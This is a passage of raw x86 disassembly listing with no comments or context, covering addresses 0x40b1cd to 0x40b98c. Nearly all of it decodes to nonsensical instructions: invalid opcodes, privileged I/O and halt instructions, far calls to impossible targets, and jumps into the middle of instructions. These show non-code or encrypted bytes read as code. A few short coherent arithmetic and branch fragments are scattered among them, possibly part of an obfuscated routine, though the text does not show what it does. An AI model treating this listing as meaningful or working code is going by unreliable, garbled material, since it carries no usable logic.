  40b1cd:	ss pop ecx
  40b1cf:	(bad)  
  40b1d0:	xor    DWORD PTR [ebx],edx
  40b1d2:	mov    edx,0x5eba3b5c
  40b1d7:	add    esp,edi
  40b1d9:	sub    al,BYTE PTR [ebp-0x2b]
  40b1dc:	call   0x5f8e68e2
  40b1e1:	xor    eax,0x74497f37
  40b1e6:	jno    0x40b20c
  40b1e8:	fiadd  DWORD PTR [esi-0x4edcd8eb]
  40b1ee:	ins    DWORD PTR es:[edi],dx
  40b1ef:	icebp  
  40b1f0:	push   esp
  40b1f1:	xlat   BYTE PTR ds:[ebx]
  40b1f2:	aad    0xeb
  40b1f4:	into   
  40b1f5:	jns    0x40b24e
  40b1f7:	xchg   esi,eax
  40b1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f9:	hlt    
  40b1fa:	not    edi
  40b1fc:	bound  esp,QWORD PTR [edi]
  40b1fe:	mov    al,0xa3
  40b200:	fwait
  40b201:	neg    ch
  40b203:	enter  0xb8cf,0x6b
  40b207:	adc    esi,ecx
  40b209:	xchg   ebp,eax
  40b20a:	mov    edi,0x86dbe6d0
  40b20f:	sbb    al,0x75
  40b211:	jl     0x40b288
  40b213:	mov    eax,ds:0x30bbf182
  40b218:	outs   dx,DWORD PTR ds:[esi]
  40b219:	cld    
  40b21a:	mov    eax,0x39db975f
  40b21f:	mov    DWORD PTR [ebx],0xb88bba9e
  40b225:	and    dl,cl
  40b227:	iret   
  40b228:	rcl    ah,1
  40b22a:	enter  0xe14a,0xe1
  40b22e:	bswap  ebx
  40b230:	xor    BYTE PTR [eax-0x1f],0xcd
  40b234:	add    DWORD PTR [edx],ebx
  40b236:	push   esi
  40b237:	jns    0x40b26e
  40b239:	fs adc al,0x7c
  40b23c:	mov    bl,0xb3
  40b23e:	fld    QWORD PTR [edi+0x4e03e59c]
  40b244:	ja     0x40b25b
  40b246:	es dec ebx
  40b248:	clc    
  40b249:	jae    0x40b263
  40b24b:	or     eax,0x9dc02d07
  40b250:	push   ecx
  40b252:	inc    esi
  40b253:	cli    
  40b254:	mov    bl,0xde
  40b256:	(bad)  
  40b257:	sub    eax,0x739521cd
  40b25c:	cmp    esp,esp
  40b25e:	std    
  40b25f:	inc    esi
  40b260:	and    dl,BYTE PTR [ecx+0x609afd50]
  40b266:	loope  0x40b28b
  40b268:	(bad)  
  40b269:	hlt    
  40b26a:	dec    esi
  40b26b:	and    eax,0x6eb4e78c
  40b270:	repnz pop ds
  40b272:	test   al,0xb4
  40b274:	fcomp  QWORD PTR [ecx-0x3461e08e]
  40b27a:	rol    BYTE PTR [ebx],1
  40b27c:	jp     0x40b214
  40b27e:	stc    
  40b27f:	jmp    0xdd30d939
  40b284:	add    eax,0xe5837dea
  40b289:	xchg   ebp,eax
  40b28a:	ffree  st(2)
  40b28c:	(bad)  
  40b28e:	pop    edi
  40b290:	push   esi
  40b291:	push   es
  40b292:	ja     0x40b280
  40b294:	idiv   BYTE PTR [ecx]
  40b296:	mov    eax,ds:0xdede3427
  40b29b:	jo     0x40b278
  40b29d:	shr    DWORD PTR [eax+0x29],1
  40b2a0:	sub    dl,BYTE PTR [esi+0x45251e3e]
  40b2a6:	add    eax,0x94f60361
  40b2ab:	cmc    
  40b2ac:	ins    BYTE PTR es:[edi],dx
  40b2ad:	sbb    BYTE PTR [esi],dl
  40b2af:	jnp    0x40b2a5
  40b2b1:	stos   DWORD PTR es:[edi],eax
  40b2b2:	ficom  DWORD PTR [ebp+0x208ff102]
  40b2b8:	fadd   DWORD PTR [edi+0x1673c]
  40b2be:	xchg   edx,eax
  40b2bf:	and    ebp,DWORD PTR [edx-0x38c641d2]
  40b2c5:	js     0x40b26a
  40b2c7:	mov    eax,0x1b6118bd
  40b2cc:	icebp  
  40b2cd:	mov    DWORD PTR [eax+esi*4-0x4d],0xc3df5c82
  40b2d5:	jecxz  0x40b305
  40b2d7:	fdivr  st,st(0)
  40b2d9:	into   
  40b2da:	sbb    al,0x59
  40b2dc:	xor    ch,dh
  40b2de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2df:	xor    eax,DWORD PTR [eax+0x7096fdc1]
  40b2e5:	fstp   TBYTE PTR [edx-0x3b]
  40b2e8:	pusha  
  40b2e9:	pop    eax
  40b2ea:	daa    
  40b2eb:	jb     0x40b2a5
  40b2ed:	jmp    0x40b2f3
  40b2ef:	enter  0x11e6,0xc7
  40b2f3:	mov    ds:0x9ea746f0,al
  40b2f8:	repnz mov al,ds:0x14f1687f
  40b2fe:	ss out 0xb9,al
  40b301:	mov    dl,0x32
  40b303:	ja     0x40b291
  40b305:	les    esp,FWORD PTR [ebx+0x4cb1942d]
  40b30b:	(bad)  
  40b30c:	push   cs
  40b30d:	(bad)  
  40b30e:	jge    0x40b309
  40b310:	mov    BYTE PTR [edx+ebp*8-0x68],0x4b
  40b315:	cmp    esp,eax
  40b317:	xor    al,0x95
  40b319:	dec    esi
  40b31a:	mov    bh,0x19
  40b31c:	jecxz  0x40b2ec
  40b31e:	sub    bl,BYTE PTR ds:0xeb4903c5
  40b324:	and    al,0x5b
  40b326:	adc    dh,BYTE PTR [ecx+0x1f1b2bfb]
  40b32c:	mov    dh,0x32
  40b32e:	jg     0x40b2ba
  40b330:	mov    edi,esp
  40b332:	sbb    edi,ecx
  40b334:	push   ss
  40b335:	mov    edi,0x82454052
  40b33a:	fcomp  QWORD PTR [edi]
  40b33c:	inc    ecx
  40b33d:	pop    esi
  40b33e:	ficomp WORD PTR [ebx]
  40b340:	add    BYTE PTR [ebx+edx*8],cl
  40b343:	loope  0x40b2fc
  40b345:	stos   DWORD PTR es:[edi],eax
  40b346:	mov    dh,0xf6
  40b348:	xlat   BYTE PTR ds:[ebx]
  40b349:	cmp    dh,BYTE PTR [ebx-0x7d]
  40b34c:	sub    al,0xa2
  40b34e:	out    0xb9,al
  40b350:	cs addr16 pop esi
  40b353:	ret    
  40b354:	out    dx,al
  40b355:	xchg   esi,eax
  40b356:	scas   al,BYTE PTR es:[edi]
  40b357:	pusha  
  40b358:	mov    ah,bl
  40b35a:	push   ecx
  40b35b:	and    ecx,esi
  40b35d:	adc    al,0xeb
  40b35f:	call   0x2f7c0248
  40b364:	fnstsw WORD PTR [esi-0x7a]
  40b367:	int    0x7b
  40b369:	jbe    0x40b38a
  40b36b:	push   0xffffffb3
  40b36d:	aaa    
  40b36e:	pop    ds
  40b36f:	inc    eax
  40b370:	jg     0x40b3dc
  40b372:	pop    ebp
  40b373:	call   0x5d81:0xb166a80a
  40b37a:	fs sti 
  40b37c:	test   al,0x96
  40b37e:	fcom   QWORD PTR [edx+0x50]
  40b381:	dec    ebp
  40b382:	outs   dx,BYTE PTR ds:[esi]
  40b383:	xor    DWORD PTR [edx+edi*1],esp
  40b386:	inc    ebx
  40b387:	mov    esp,0x93bc1e64
  40b38c:	leave  
  40b38d:	mov    al,ds:0xaf99e803
  40b392:	pop    ecx
  40b393:	sahf   
  40b394:	push   ds
  40b395:	leave  
  40b396:	adc    dl,ch
  40b398:	push   0x57ec84c2
  40b39d:	sahf   
  40b39e:	mov    al,ds:0x68998a38
  40b3a3:	mov    edx,0x276b1456
  40b3a8:	out    0x6,al
  40b3aa:	mov    esp,0xce9a7c77
  40b3af:	je     0x40b3f3
  40b3b1:	call   0x3138550d
  40b3b6:	and    al,0xc9
  40b3b8:	jne    0x40b381
  40b3ba:	mov    cl,0xa2
  40b3bc:	int    0x7a
  40b3be:	jmp    0xb8711a05
  40b3c3:	sti    
  40b3c4:	cld    
  40b3c5:	pop    ebx
  40b3c6:	xor    eax,0xec54ce76
  40b3cb:	pop    edi
  40b3cc:	out    dx,al
  40b3cd:	dec    esi
  40b3ce:	js     0x40b41b
  40b3d0:	popa   
  40b3d1:	mov    ch,0x55
  40b3d3:	jmp    0x84ae4395
  40b3d8:	cmc    
  40b3d9:	mov    WORD PTR gs:[ecx+0x1b4b3e52],es
  40b3e0:	mov    esi,0x15ba3c41
  40b3e5:	cwde   
  40b3e6:	(bad)  
  40b3e7:	cmp    al,0x4f
  40b3e9:	and    BYTE PTR ds:0x1f63535f,0x6e
  40b3f0:	add    dh,al
  40b3f2:	or     BYTE PTR [edi],0x7a
  40b3f5:	stos   BYTE PTR es:[edi],al
  40b3f6:	push   ecx
  40b3f7:	fild   QWORD PTR ds:0xf271fd5c
  40b3fd:	(bad)  
  40b3fe:	sub    DWORD PTR [eax],edx
  40b400:	aad    0x2f
  40b402:	js     0x40b466
  40b404:	ror    BYTE PTR [edi-0x7d],0x56
  40b408:	pop    esi
  40b409:	mov    eax,0xd4b2a76a
  40b40e:	mov    bh,0x7d
  40b410:	push   0xab0e0375
  40b415:	mov    ecx,0xb93e1dd
  40b41a:	add    ah,dh
  40b41c:	in     eax,0x46
  40b41e:	outs   dx,DWORD PTR ds:[esi]
  40b41f:	jnp    0x40b47f
  40b421:	cs xor al,0xcd
  40b424:	into   
  40b425:	jle    0x40b3ae
  40b427:	loop   0x40b466
  40b429:	inc    ebp
  40b42a:	mov    ecx,0x8f2dcdc4
  40b42f:	repnz movs WORD PTR es:[edi],WORD PTR ds:[esi]
  40b432:	imul   esp,eax,0x4d2886f1
  40b438:	push   ecx
  40b439:	jp     0x40b498
  40b43b:	inc    esp
  40b43c:	xchg   ebp,eax
  40b43d:	push   esi
  40b43e:	ins    DWORD PTR es:[edi],dx
  40b43f:	into   
  40b440:	and    cl,0x92
  40b443:	push   edx
  40b444:	dec    edx
  40b445:	dec    edi
  40b446:	out    dx,eax
  40b447:	push   eax
  40b448:	fist   WORD PTR [edx+ecx*8]
  40b44b:	clc    
  40b44c:	in     al,0x2c
  40b44e:	or     esp,DWORD PTR [ebx+edi*4+0x7dee07ac]
  40b455:	push   esi
  40b456:	jae    0x40b462
  40b458:	pop    ds
  40b459:	(bad)  [esi-0x64]
  40b45c:	dec    ebx
  40b45d:	add    eax,0x9b479e6c
  40b462:	adc    BYTE PTR [edx+0x49],bh
  40b465:	push   eax
  40b466:	sub    eax,0x3d376147
  40b46b:	dec    eax
  40b46c:	(bad)  
  40b46e:	(bad)  
  40b46f:	and    BYTE PTR [ebx],bh
  40b471:	rcr    DWORD PTR [ebx+eax*8+0x26],cl
  40b475:	fisub  DWORD PTR [eax+0x486e3c69]
  40b47b:	sbb    eax,0xb843878b
  40b480:	cmp    BYTE PTR [ebx+eiz*4+0x16],cl
  40b484:	nop
  40b485:	enter  0x3496,0x49
  40b489:	xchg   BYTE PTR gs:[eax-0x3f],cl
  40b48d:	mov    esi,0x6c9f153b
  40b492:	cmp    eax,0xb0ed116d
  40b497:	fistp  DWORD PTR [ecx-0x2f]
  40b49a:	jo     0x40b451
  40b49c:	pop    ebx
  40b49d:	aam    0x8
  40b49f:	loopne 0x40b4b9
  40b4a1:	dec    edx
  40b4a2:	int    0x9a
  40b4a4:	test   al,0x43
  40b4a6:	aas    
  40b4a7:	les    ebx,FWORD PTR [ebx-0x6d]
  40b4aa:	xchg   ebp,eax
  40b4ab:	mov    dl,0xd
  40b4ad:	push   ecx
  40b4ae:	pop    es
  40b4af:	jb     0x40b46f
  40b4b1:	mov    edi,0x40feac11
  40b4b6:	push   edx
  40b4b7:	imul   eax,eax,0x2572049d
  40b4bd:	gs call 0xb99f9a18
  40b4c3:	push   edx
  40b4c4:	es adc edx,ebp
  40b4c7:	sub    DWORD PTR [edi+eax*2],ebx
  40b4ca:	out    dx,al
  40b4cb:	xchg   ebp,eax
  40b4cc:	sub    eax,0xda466142
  40b4d1:	pop    ebx
  40b4d2:	retf   
  40b4d3:	mov    bh,0x46
  40b4d5:	pop    esp
  40b4d6:	pop    ss
  40b4d7:	std    
  40b4d8:	loopne 0x40b487
  40b4da:	dec    edi
  40b4db:	xor    eax,0x7c44cec5
  40b4e0:	mov    esi,0x393c5e6
  40b4e5:	cmp    BYTE PTR [ecx],bh
  40b4e7:	pushf  
  40b4e8:	inc    esp
  40b4e9:	icebp  
  40b4ea:	add    al,0x1f
  40b4ec:	mov    ebp,0x522cee96
  40b4f1:	xchg   DWORD PTR [eax],esi
  40b4f3:	aaa    
  40b4f4:	adc    ecx,DWORD PTR [edx+0x17]
  40b4f7:	call   0x5f2e:0x23dc5436
  40b4fe:	mov    ecx,DWORD PTR [edx]
  40b500:	je     0x40b505
  40b502:	mov    esp,0x3d5b56ad
  40b507:	pop    ecx
  40b508:	sub    bl,BYTE PTR [ebp+0x74df1d0e]
  40b50e:	ins    DWORD PTR es:[edi],dx
  40b50f:	in     eax,0x16
  40b511:	popa   
  40b512:	fnstenv [edi]
  40b514:	push   ss
  40b515:	cmp    DWORD PTR [esi+0x3dd2b470],eax
  40b51b:	outs   dx,DWORD PTR ds:[esi]
  40b51c:	mov    ecx,0xfc247cb
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	add    dl,BYTE PTR [eax]
  40b551:	mov    ecx,ebp
  40b553:	rol    DWORD PTR [esi+0x7d9f7070],0x70
  40b55a:	jo     0x40b515
  40b55c:	popf   
  40b55d:	pop    ds
  40b55e:	out    0xb4,al
  40b560:	add    al,0x5b
  40b562:	sbb    esi,DWORD PTR [ecx]
  40b564:	fidiv  WORD PTR [ecx]
  40b566:	pop    edx
  40b567:	test   eax,0xaeff2798
  40b56c:	or     edx,DWORD PTR [eax+0x73153f07]
  40b572:	xchg   BYTE PTR [esi+0x67b4db1c],bl
  40b578:	jg     0x40b5e9
  40b57a:	pop    ecx
  40b57b:	mov    WORD PTR [edx],ds
  40b57d:	lods   eax,DWORD PTR ds:[esi]
  40b57e:	stc    
  40b57f:	push   ss
  40b580:	cmp    cl,bh
  40b582:	das    
  40b583:	and    bl,bl
  40b585:	imul   BYTE PTR [ebx]
  40b587:	adc    al,bh
  40b589:	jle    0x40b5aa
  40b58b:	call   0xaa7a:0x4ec73a04
  40b592:	stc    
  40b593:	fadd   QWORD PTR [edi+esi*8+0x4e2b3afb]
  40b59a:	push   0x3bf0c94e
  40b59f:	xlat   BYTE PTR ds:[ebx]
  40b5a0:	test   eax,0xe2b8ac65
  40b5a5:	retf   
  40b5a6:	leave  
  40b5a7:	mov    esi,edi
  40b5a9:	or     bl,BYTE PTR [edi+ebp*8]
  40b5ac:	ins    DWORD PTR es:[edi],dx
  40b5ad:	xchg   edx,eax
  40b5ae:	repnz mov cl,0x6
  40b5b1:	je     0x40b5d0
  40b5b3:	outs   dx,DWORD PTR ds:[esi]
  40b5b4:	mov    al,ds:0x42fac832
  40b5b9:	push   ecx
  40b5ba:	mov    bl,0x88
  40b5bc:	inc    ecx
  40b5bd:	xchg   esp,eax
  40b5be:	stc    
  40b5bf:	dec    BYTE PTR [ebp-0x3e]
  40b5c2:	rcr    BYTE PTR [edi-0x56],0x60
  40b5c6:	test   al,0xba
  40b5c8:	adc    cl,BYTE PTR [edx+0x34]
  40b5cb:	lahf   
  40b5cc:	into   
  40b5cd:	mov    dl,0x30
  40b5cf:	std    
  40b5d0:	fisttp QWORD PTR [edi+ecx*2-0x6fadcdd7]
  40b5d7:	xor    ah,bl
  40b5d9:	pop    edx
  40b5da:	aam    0x5
  40b5dc:	push   ds
  40b5dd:	cld    
  40b5de:	nop
  40b5df:	dec    eax
  40b5e0:	test   DWORD PTR cs:[esi],0xf6a78a44
  40b5e7:	addr16 push 0xf19df8bc
  40b5ed:	add    al,0x66
  40b5ef:	out    dx,al
  40b5f0:	ja     0x40b5e1
  40b5f2:	adc    BYTE PTR [ebp+edi*2-0x29],bl
  40b5f6:	push   eax
  40b5f7:	ds aaa 
  40b5f9:	jne    0x40b5c0
  40b5fb:	inc    edx
  40b5fc:	mov    edi,0x7967f6
  40b601:	mov    BYTE PTR [esi],0x2d
  40b604:	outs   dx,BYTE PTR ds:[esi]
  40b605:	mov    ecx,0x76d0eae2
  40b60a:	stc    
  40b60b:	frstor [ebx+0x6a]
  40b60e:	mov    WORD PTR [ecx-0x46a4cd4f],gs
  40b614:	and    ecx,DWORD PTR [esi+0x6d]
  40b617:	push   edx
  40b618:	scas   al,BYTE PTR es:[edi]
  40b619:	jno    0x40b5e3
  40b61b:	push   ebx
  40b61c:	mov    al,ds:0xeea514d2
  40b621:	cmp    ebp,DWORD PTR [edx+ebp*1-0x54]
  40b625:	lods   al,BYTE PTR ds:[esi]
  40b626:	loopne 0x40b65a
  40b628:	push   0x3f
  40b62a:	xchg   ebp,eax
  40b62b:	adc    al,0x18
  40b62d:	dec    esi
  40b62e:	pop    edi
  40b62f:	hlt    
  40b630:	call   0x16fe:0x497ec271
  40b637:	adc    esi,ecx
  40b639:	call   0x3390:0x5e0f5f96
  40b640:	jge    0x40b6aa
  40b642:	pop    ebp
  40b643:	outs   dx,DWORD PTR ds:[esi]
  40b644:	call   0xcab9:0xda2749ea
  40b64b:	lods   eax,DWORD PTR ds:[esi]
  40b64c:	cmp    eax,0xfef72ef6
  40b651:	pop    ebp
  40b652:	jge    0x40b6b4
  40b654:	aam    0x29
  40b656:	mov    dh,0x34
  40b658:	(bad)  
  40b659:	out    0x2f,eax
  40b65b:	push   ebx
  40b65c:	lock dec edi
  40b65e:	cs jge 0x40b620
  40b661:	mov    al,ds:0xd4c6604f
  40b666:	(bad)  
  40b667:	adc    al,0xfa
  40b669:	dec    ebp
  40b66a:	and    al,0x40
  40b66c:	inc    edx
  40b66d:	jg     0x40b64f
  40b66f:	inc    ebx
  40b670:	mov    bh,0x5a
  40b672:	pop    ds
  40b673:	adc    eax,0x36fb0efa
  40b678:	cmp    eax,0x2f23ccdf
  40b67d:	lods   eax,DWORD PTR ds:[esi]
  40b67e:	jb     0x40b6f6
  40b680:	sar    al,0x11
  40b683:	test   eax,0xa5fde3b7
  40b688:	neg    BYTE PTR [ebx+0x12]
  40b68b:	sti    
  40b68c:	lods   al,BYTE PTR ds:[esi]
  40b68d:	xor    DWORD PTR [edi+0x36edf43a],ecx
  40b693:	sub    BYTE PTR ds:0x38c438f0,bl
  40b699:	push   edi
  40b69a:	cmp    al,0x51
  40b69c:	mov    edi,0x1ffe9f06
  40b6a1:	sbb    dh,BYTE PTR [eax]
  40b6a3:	test   BYTE PTR [eax],dl
  40b6a5:	pop    ss
  40b6a6:	mov    ds:0xccc90a1f,al
  40b6ab:	and    DWORD PTR [edi],ebx
  40b6ad:	jl     0x40b719
  40b6af:	dec    ebx
  40b6b0:	pop    es
  40b6b1:	xchg   ebx,eax
  40b6b2:	mov    bl,0x86
  40b6b4:	and    eax,0x9c3da80d
  40b6b9:	dec    esi
  40b6ba:	mov    ds:0x76501611,eax
  40b6bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6c0:	inc    esi
  40b6c1:	int    0x2e
  40b6c3:	ds std 
  40b6c5:	adc    DWORD PTR [eax],edx
  40b6c7:	push   edi
  40b6c8:	inc    edi
  40b6c9:	or     al,0x50
  40b6cb:	adc    edi,0x54
  40b6ce:	jno    0x40b669
  40b6d0:	imul   esi,edi,0x48161323
  40b6d6:	mov    cl,0xe7
  40b6d8:	mov    ecx,0xd245e0dc
  40b6dd:	xchg   ebp,eax
  40b6de:	retf   0x920a
  40b6e1:	xchg   ecx,eax
  40b6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6e3:	fcom   DWORD PTR [eax+eiz*4]
  40b6e6:	ret    
  40b6e7:	inc    esi
  40b6e8:	mov    cl,0x18
  40b6ea:	ror    DWORD PTR [edx-0x71],cl
  40b6ed:	jne    0x40b67d
  40b6ef:	push   cs
  40b6f0:	shl    esi,1
  40b6f2:	pop    edx
  40b6f3:	out    0x67,al
  40b6f5:	jbe    0x40b683
  40b6f7:	mov    ch,0x4e
  40b6f9:	adc    dl,BYTE PTR [edi]
  40b6fb:	adc    eax,DWORD PTR [eax+0x3c73cf37]
  40b701:	mov    ds:0x60fcbe16,al
  40b706:	xrelease mov DWORD PTR [eax],edi
  40b709:	dec    esp
  40b70a:	int3   
  40b70b:	shr    BYTE PTR [ebx+0x69cac8b9],0x3e
  40b712:	cmp    al,0x8d
  40b714:	sub    esi,ebp
  40b716:	lods   al,BYTE PTR ds:[esi]
  40b717:	mov    bl,0x27
  40b719:	add    dh,BYTE PTR [ebx+eiz*8-0x68e1a3f0]
  40b720:	(bad)  
  40b721:	xchg   ebx,eax
  40b722:	xor    al,0x91
  40b724:	stos   DWORD PTR es:[edi],eax
  40b725:	daa    
  40b726:	xchg   esp,eax
  40b727:	dec    edx
  40b728:	sbb    cl,BYTE PTR [edi+0x6e]
  40b72b:	mov    ebp,0xfe3e455c
  40b730:	xchg   edi,eax
  40b731:	lea    edi,[ecx+edi*4+0x13]
  40b735:	mov    edx,0x6775fa40
  40b73a:	mov    al,ds:0x513fe66a
  40b73f:	adc    BYTE PTR [ebp+0x58],dl
  40b742:	or     DWORD PTR ds:0xd1fc6bb4,0x6c56cce9
  40b74c:	dec    edi
  40b74d:	inc    edx
  40b74e:	stos   BYTE PTR es:[edi],al
  40b74f:	adc    eax,0x7fd95007
  40b754:	pop    ebp
  40b755:	push   ebp
  40b756:	cmp    eax,0xb94bd79c
  40b75b:	and    BYTE PTR [edi-0x26],dh
  40b75e:	jb     0x40b6ee
  40b760:	arpl   WORD PTR [edi+0x7e],dx
  40b763:	dec    edx
  40b764:	int    0x37
  40b766:	test   eax,0x1150a4d5
  40b76b:	lods   al,BYTE PTR ds:[esi]
  40b76c:	adc    ah,dl
  40b76e:	repz test BYTE PTR [esi],0x0
  40b772:	mov    al,0xcf
  40b774:	jmp    0xeaeda360
  40b779:	adc    dl,BYTE PTR [ebp+0x74]
  40b77c:	xor    al,0x1d
  40b77f:	xor    eax,DWORD PTR [esi]
  40b781:	cdq    
  40b782:	or     edi,DWORD PTR ds:0x95e640f8
  40b788:	jo     0x40b7e3
  40b78a:	shl    BYTE PTR [esi],1
  40b78c:	pop    esp
  40b78d:	ror    DWORD PTR [esi+0x65e09026],0xc1
  40b794:	cmp    eax,0x907724c5
  40b799:	add    BYTE PTR [eax-0x48cd29c9],0x9
  40b7a0:	cmp    bh,BYTE PTR [edx+edx*8+0x30]
  40b7a4:	fwait
  40b7a5:	lock cmp al,0xfa
  40b7a8:	pop    edi
  40b7a9:	mov    esp,0x496dea21
  40b7ae:	pop    es
  40b7af:	sbb    dl,BYTE PTR [ebx]
  40b7b1:	scas   eax,DWORD PTR es:[edi]
  40b7b2:	std    
  40b7b3:	lock (bad) 
  40b7b5:	pop    ecx
  40b7b6:	xor    BYTE PTR [esi+0x17],0x2b
  40b7ba:	call   0xbfa5:0xc11fabd9
  40b7c1:	sbb    al,0xbd
  40b7c3:	or     DWORD PTR cs:[ecx+0x42],edx
  40b7c7:	mov    bl,0xf
  40b7c9:	jge    0x40b843
  40b7cb:	inc    edx
  40b7cc:	ror    BYTE PTR [ecx+0x4a234235],cl
  40b7d2:	mov    cl,0xa5
  40b7d4:	xor    DWORD PTR [ebx+0x5a0b7c98],edx
  40b7da:	jbe    0x40b790
  40b7dc:	outs   dx,BYTE PTR ds:[esi]
  40b7dd:	sub    ebx,DWORD PTR [eax-0x7043ad2d]
  40b7e3:	ror    DWORD PTR [eax-0x1b29adf7],cl
  40b7e9:	or     al,0x26
  40b7eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7ed:	xchg   esi,eax
  40b7ee:	imul   esi,ebx,0xd40a16b1
  40b7f4:	sbb    DWORD PTR ds:0x1613a985,0x55
  40b7fb:	jmp    0x40b82f
  40b7fd:	dec    ecx
  40b7fe:	mov    edx,0x1e06e59b
  40b803:	jmp    0xa2d7:0x703c60ac
  40b80a:	mov    esi,0xe974af0f
  40b80f:	sbb    BYTE PTR [ecx+0x1691e3c7],bl
  40b815:	push   edx
  40b816:	test   al,0xd2
  40b818:	jl     0x40b81d
  40b81a:	cmp    eax,0x6449971
  40b81f:	icebp  
  40b820:	in     eax,dx
  40b821:	mov    edi,0x18ed593d
  40b826:	shl    BYTE PTR [ecx+0x6b],0xa9
  40b82a:	inc    ecx
  40b82b:	inc    ebx
  40b82c:	add    esp,DWORD PTR [edi]
  40b82e:	and    esp,0x13
  40b831:	(bad)  
  40b832:	aaa    
  40b833:	adc    al,0x87
  40b835:	pusha  
  40b836:	push   0xffffffa5
  40b838:	cdq    
  40b839:	dec    bx
  40b83b:	add    al,BYTE PTR [ebx+0xe]
  40b83e:	int3   
  40b83f:	or     eax,0xad6786ad
  40b844:	lock fwait
  40b846:	mov    al,0x93
  40b848:	outs   dx,DWORD PTR ds:[esi]
  40b849:	sub    bh,dl
  40b84b:	(bad)  [ebp+0x49]
  40b84e:	pop    ds
  40b84f:	inc    esp
  40b850:	xlat   BYTE PTR ds:[ebx]
  40b851:	or     edi,DWORD PTR [ecx-0x62]
  40b854:	mov    ds:0xaf090247,eax
  40b859:	sar    DWORD PTR [ebx-0x31fc67bb],0x89
  40b860:	sub    ah,ch
  40b862:	sub    edx,DWORD PTR [edi]
  40b864:	dec    ebp
  40b865:	ds cmp al,0x42
  40b868:	xchg   ecx,eax
  40b869:	mov    eax,0x168f54f1
  40b86e:	loope  0x40b87b
  40b870:	or     esp,ebp
  40b872:	adc    DWORD PTR [ecx-0x5efae01b],esi
  40b878:	xor    ebp,DWORD PTR [ecx+esi*4+0x74]
  40b87c:	and    eax,0xaa457249
  40b881:	shl    BYTE PTR [edi+esi*4-0x1f],cl
  40b885:	mov    al,0x29
  40b887:	mov    BYTE PTR [edx+esi*4+0x5a2cfa3],al
  40b88e:	inc    eax
  40b88f:	ret    
  40b890:	and    dl,BYTE PTR [ebx-0x24d1000c]
  40b896:	addr16 test al,0x78
  40b89a:	and    eax,0x9ff81d4d
  40b89f:	es xchg ebp,eax
  40b8a1:	adc    edi,eax
  40b8a3:	mov    al,0x9c
  40b8a5:	repnz xchg ebx,eax
  40b8a7:	mov    edi,0x650a1f23
  40b8ac:	call   0x249b:0x9965827b
  40b8b3:	test   edx,esp
  40b8b5:	data16 fiadd WORD PTR ds:0xdad90b10
  40b8bc:	dec    edx
  40b8bd:	push   0xffffffa9
  40b8bf:	hlt    
  40b8c0:	sub    dh,BYTE PTR [esi]
  40b8c2:	sub    eax,0xecd86db7
  40b8c7:	les    ebp,FWORD PTR [eax+0x6505613c]
  40b8cd:	idiv   DWORD PTR [edi]
  40b8cf:	stc    
  40b8d0:	sbb    BYTE PTR [eax+0x1e65a989],cl
  40b8d6:	out    0x37,al
  40b8d8:	dec    dh
  40b8da:	mov    ah,BYTE PTR [ebx]
  40b8dc:	clc    
  40b8dd:	loopne 0x40b8cb
  40b8df:	push   ebp
  40b8e0:	xchg   edi,eax
  40b8e1:	mov    esp,ecx
  40b8e3:	cmp    DWORD PTR [ebx+0x6f],0xffffff86
  40b8e7:	cmp    eax,0xd6703d41
  40b8ec:	cmc    
  40b8ed:	or     al,0x29
  40b8ef:	add    eax,0x7d5ecd9f
  40b8f4:	test   DWORD PTR es:[edi],edi
  40b8f7:	xchg   ebx,eax
  40b8f8:	jns    0x40b8f7
  40b8fa:	shl    DWORD PTR [ebx+0x33fc7d8b],0xd0
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x4bd266fb],cl
  40b949:	inc    edx
  40b94a:	aad    0x60
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b942
  40b954:	lock fwait
  40b956:	enter  0x5cfb,0xf2
  40b95a:	mov    al,0xb7
  40b95c:	xor    eax,0xc7bb83f4
  40b961:	shl    BYTE PTR [edi-0x5],cl
  40b964:	cmc    
  40b965:	jne    0x40b968
  40b967:	call   0xc31d2ae3
  40b96c:	jnp    0x40b8fa
  40b96e:	mov    cl,0xf8
  40b970:	xor    cl,al
  40b972:	ss push edx
  40b974:	out    dx,al
  40b975:	adc    BYTE PTR [ebx],ah
  40b977:	xor    eax,0xc766bc9d
  40b97c:	stos   DWORD PTR es:[edi],eax
  40b97d:	mov    ecx,0xee8ac7f5
  40b982:	fld    QWORD PTR [eax+0xf]
  40b985:	add    DWORD PTR [edx-0x5b0eed8],esp
  40b98b:	sahf   
  40b98c:	xor    al,BYTE PTR [ecx]
